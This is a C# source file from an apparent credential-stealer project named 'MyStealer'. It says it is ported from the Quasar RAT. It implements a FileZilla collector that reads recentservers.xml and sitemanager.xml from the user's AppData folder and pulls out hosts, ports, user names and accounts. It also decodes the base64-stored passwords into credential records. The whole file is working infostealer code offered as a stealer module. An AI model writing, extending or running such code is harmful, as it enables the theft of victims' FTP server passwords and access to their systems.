using Serilog;
using System;
using System.Collections.Generic;
using System.Collections.Immutable;
using System.IO;
using System.Text;
using System.Xml.Linq;

namespace MyStealer.Collectors.FtpClient
{
    /// <summary>
    /// Ported from Quasar RAT
    /// https://github.com/quasar/Quasar/blob/master/Quasar.Client/Recovery/FtpClients/WinScpPassReader.cs
    /// </summary>
    internal class FileZilla : IMessengerCollector
    {
        public virtual string ApplicationName => "FileZilla";

        private ILogger lazyLogger;
        public ILogger Logger => lazyLogger ?? (lazyLogger = LogExt.ForModule(ApplicationName));

        public IImmutableSet<CredentialEntry> GetCredentials()
        {
            var set = ImmutableHashSet.CreateBuilder<CredentialEntry>();

            var dataFolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FileZilla");
            ReadXml(set, Path.Combine(dataFolder, "recentservers.xml"));
            ReadXml(set, Path.Combine(dataFolder, "sitemanager.xml"));

            return set.ToImmutable();
        }

        private void ReadXml(ISet<CredentialEntry> set, string path)
        {
            if (!File.Exists(path))
            {
                Logger.Warning("Data file {path} doesn't exists.", path);
                return;
            }

            try
            {
                using (var stream = File.Open(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    Logger.Debug("Start parsing {path}", path);
                    var doc = XDocument.Load(stream);
                    foreach (var server in doc.Root.FirstNode.Document.Elements("Server"))
                    {
                        try
                        {
                            var host = server.Element("Host").Value + ':' + server.Element("Port").Value;
                            var userName = server.Element("User")?.Value ?? "";
                            var pass = server.Element("Pass")?.Value ?? "";
                            var account = server.Element("Account")?.Value ?? "";
                            pass = Encoding.UTF8.GetString(Convert.FromBase64String(pass));

                            set.Add(new CredentialEntry
                            {
                                ApplicationName = ApplicationName,
                                ApplicationProfileName = "",
                                Host = host,
                                UserName = string.IsNullOrWhiteSpace(account) ? userName : $"{userName} (account: {account})",
                                Password = pass
                            });
                        }
                        catch (Exception ex)
                        {
                            Logger.Warning(ex, "Error parsing single data xml entry");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "Error parsing data xml: {path}", path);
            }
        }
    }
}
